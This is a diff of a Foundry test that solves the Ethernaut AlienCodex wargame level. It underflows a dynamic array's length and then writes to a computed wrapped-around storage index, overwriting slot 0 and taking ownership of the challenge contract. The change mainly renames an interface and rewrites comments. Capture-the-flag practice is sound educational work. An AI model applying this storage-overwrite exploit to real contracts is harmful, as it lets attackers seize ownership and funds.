@@ -4,22 +4,20 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../utils.sol";
 
-interface IAlienCodexTest {
+interface IAlienCodex {
   function make_contact() external;
   function retract() external;
-  function revise(uint i, bytes32 _content) external;
+  function revise(uint, bytes32) external;
 }
 
 contract AlienCodexTest is Test {
   uint256 internal constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
-
-
-  IAlienCodexTest internal challenge;
   address internal challengeAddress;
+  IAlienCodex internal challenge;
 
   function setUp() public {
     challengeAddress = utils.createLevelInstance(0x40055E69E7EB12620c8CCBCCAb1F187883301c30);
-    challenge = IAlienCodexTest(challengeAddress);
+    challenge = IAlienCodex(challengeAddress);
   }
 
   function testExploit() public {
@@ -34,17 +32,17 @@ contract AlienCodexTest is Test {
 
     // now we need our trick to write into slot0 (0x00...00)
 
-    // - here is where the first element of codex should be stored
-    bytes32 firstElementSlot = keccak256(abi.encodePacked(uint256(1)));
+    // here is where the first element of codex should be stored
+    bytes32 firstElementSlot = keccak256(abi.encodePacked(uint(1)));
 
-    // - 0x00...00 = firstElementSlot + offset =>
-    //   - offset = 0x00...00 - firstElement = 1 + 0xff...ff - firstElement
-    //   - that substraction can be done with an XOR
+    // 0x00 = offset + keccak256(1)                // reorganize
+    // offset = 0x00 - keccak256(1)                // But 0x00 =  MAX_UINT256 + 1
+    // offset = MAX_UINT256 + 1 - keccak256(1)     // But MAX_UINT256 - x = MAX_UINT256 ^ x
+    // offset = ( MAX_UINT256 ^ keccak256(1) ) + 1
     uint256 offset = uint256(bytes32(MAX_UINT256) ^ firstElementSlot) + 1;
 
     // write!
     challenge.revise(offset, bytes32(uint256(uint160(address(this)))));
-
     utils.submitLevelInstance(challengeAddress);
   }
 }
